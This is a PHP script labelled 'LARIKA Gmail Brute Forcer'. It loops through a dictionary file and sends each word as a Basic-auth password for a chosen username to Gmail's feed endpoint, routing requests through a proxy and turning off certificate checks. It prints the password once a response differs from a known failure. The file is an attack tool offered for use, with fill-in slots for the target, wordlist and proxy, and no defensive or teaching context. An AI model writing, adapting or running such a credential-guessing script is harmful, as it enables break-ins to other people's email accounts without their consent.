<?php 
 
// LARIKA Gmail Brute Forcer 
 
$dict = "";      // Your dictionary file here 
$username = "";  // Your username here 
$proxy = "";     // Your proxy here
$port = "";      // Your proxy port here
 
    $headers = array( 
    "Host: mail.google.com", 
    "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.4) Gecko/20060508 Firefox/1.5.0.4", 
    "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5", 
    "Accept-Language: en-us,en;q=0.5", 
    "Accept-Encoding: text", # No gzip, it only clutters your code! 
    "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7", 
    "Date: ".date(DATE_RFC822) 
    ); 
 
    $c = curl_init('https://mail.google.com/mail/feed/atom'); 
    curl_setopt($c, CURLOPT_PROXY, $proxy);
    curl_setopt($c, CURLOPT_PROXYPORT, $port);
    curl_setopt($c, CURLOPT_HTTPAUTH, CURLAUTH_ANY); // use authentication 
    curl_setopt($c, CURLOPT_HTTPHEADER, $headers); // send the headers 
    curl_setopt($c, CURLOPT_RETURNTRANSFER, 1); // We need to fetch something from a string, so no direct output! 
    curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1); // we get redirected, so follow 
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0); 
    curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 1); 
    curl_setopt($c, CURLOPT_UNRESTRICTED_AUTH, 1); // always stay authorised 
    $wrong = curl_exec($c); // Get it 
    curl_close($c); // Close the curl stream 
 
 
foreach(file($dict) as $line) 
{ 
    $word = str_replace("\r\n", "", $line); 
           if(check_correct($username, $word, $wrong)) {
            die("Found the password : ".$word.""); 
        } 
 
} 
 
 
// Function for checking whether the username and password are correct 
function check_correct($username, $password, $wrong) 
{ 
$headers1 = array( 
    "Host: gmail.google.com", 
    "Authorization: Basic ".base64_encode($username.':'.$password), 
    "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.4) Gecko/20060508 Firefox/1.5.0.4", 
    "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5", 
    "Accept-Language: en-gb,en;q=0.5", 
    "Accept-Encoding: text", 
    "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7", 
    "Date: ".date(DATE_RFC822) 
); 
 
$c = curl_init('https://gmail.google.com/gmail/feed/atom'); 
curl_setopt($c, CURLOPT_PROXY, $proxy);
curl_setopt($c, CURLOPT_PROXYPORT, $port);
curl_setopt($c, CURLOPT_HTTPAUTH, CURLAUTH_ANY); 
curl_setopt($c, CURLOPT_COOKIESESSION, true); 
curl_setopt($c, CURLOPT_HTTPHEADER, $headers1); 
curl_setopt($c, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1); 
curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0); 
curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 1); 
curl_setopt($c, CURLOPT_UNRESTRICTED_AUTH, 1); 
curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 1); 
$str = curl_exec($c); 
curl_close($c); 
print $str; // for debug 
        if($str != $wrong) {return true;} 
        else {return false;} 
} 
 
 
?> 

